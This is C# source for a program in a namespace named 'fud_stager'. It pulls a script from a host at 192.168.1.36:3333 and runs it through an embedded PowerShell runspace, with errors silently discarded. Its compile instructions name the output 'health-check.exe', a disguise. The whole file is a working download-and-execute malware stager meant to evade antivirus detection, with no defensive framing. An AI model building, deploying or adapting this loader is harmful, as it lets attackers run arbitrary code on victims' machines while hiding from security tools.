using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using PowerShell = System.Management.Automation.PowerShell;

/*
To compile add the reference in Visual studio to C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

Otherwise use csc.exe at http://bit.ly/3otOr4h with the command:
c:\Microsoft.Net.Compilers.3.8.0\tools\csc.exe /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /out:health-check.exe Program.cs
*/
namespace fud_stager
{
	class Program
    {
        static void Main(string[] args)
        {
			PowerShell Ps_instance = PowerShell.Create();

			WebClient myWebClient = new WebClient();
			try {
				var script1 = myWebClient.DownloadString("http://192.168.1.36:3333/full1.txt");
				string[] array = script1.Split('\n');
				foreach (string value in array)
				{
					Ps_instance.AddScript(value);
				}
			} catch{
			}
			//
			//Ps_instance.AddScript(script2);
			Ps_instance.AddCommand("out-string");
			Ps_instance.Invoke();

		}
    }
}
